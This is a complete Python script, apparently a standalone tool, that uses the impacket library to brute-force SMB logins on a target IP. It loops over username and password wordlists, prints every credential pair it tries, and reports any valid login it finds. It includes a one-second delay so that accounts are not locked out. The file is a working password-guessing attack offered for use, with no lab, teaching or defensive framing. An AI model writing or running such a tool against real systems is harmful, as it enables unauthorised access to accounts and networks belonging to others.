import argparse
from impacket.smbconnection import SMBConnection
import time

def smb_login_test(target_ip, username, password, domain='', timeout=10):
    try:
        smb_connection = SMBConnection(target_ip, target_ip)
        smb_connection.login(username, password, domain)
        print(f"[+] Login successful on {target_ip} with username '{username}' and password '{password}'")
        smb_connection.logoff()
        return True
    except Exception as e:
        print(f"[-] Login failed on {target_ip} with username '{username}' and password '{password}'")
        return False

def load_list_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='ISO-8859-1') as file:
            return [line.strip() for line in file.readlines()]
    except Exception as e:
        print(f"Error reading {file_path}: {e}")
        return []

def brute_force_smb(target_ip, username_list, password_list, domain=''):
    for username in username_list:
        for password in password_list:
            if smb_login_test(target_ip, username, password, domain):
                print(f"[!] Valid credentials found: {username} / {password}")
                return True
            time.sleep(1)  # Sleep to avoid rapid requests that may lock accounts
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SMB Brute Force Script")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("-l", "--userlist", required=True, help="Path to the username list file")
    parser.add_argument("-p", "--passlist", required=True, help="Path to the password list file")

    args = parser.parse_args()

    target_ip = args.target_ip
    username_file = args.userlist
    password_file = args.passlist

    username_list = load_list_from_file(username_file)
    password_list = load_list_from_file(password_file)

    if username_list and password_list:
        brute_force_smb(target_ip, username_list, password_list)
    else:
        print("Username list or password list is empty.")
